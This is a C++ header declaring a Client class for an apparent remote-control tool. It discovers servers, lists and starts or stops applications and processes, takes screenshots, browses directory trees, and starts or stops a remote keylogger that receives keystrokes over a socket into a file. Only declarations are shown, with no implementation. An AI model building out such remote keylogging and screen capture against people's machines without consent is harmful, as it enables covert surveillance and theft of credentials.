#pragma once
#include <vector>
#include <string>
#include <thread>
#include <sstream>
#include <fstream>

#include "../GlobalConstant.h"

#include "Helper.h"

class Client {
    std::ofstream _keylogFile;
    SOCKET sockfd;
    SOCKET _keylogfd;
    std::string _serverName;
    std::thread _keylogThread;
    void recvKeylog();
public:
    Client();
    ~Client();

    int discover(std::vector <std::string> &servers); // find all server can connect

    int listApp();  
    int startApp(const char *appName);
    int stopApp(const char *appName);
    
    int listProcesss();

    int screenShot();
    
    int startKeyLog();
    int stopKeyLog();

    int dirTree(const char* pathName);
};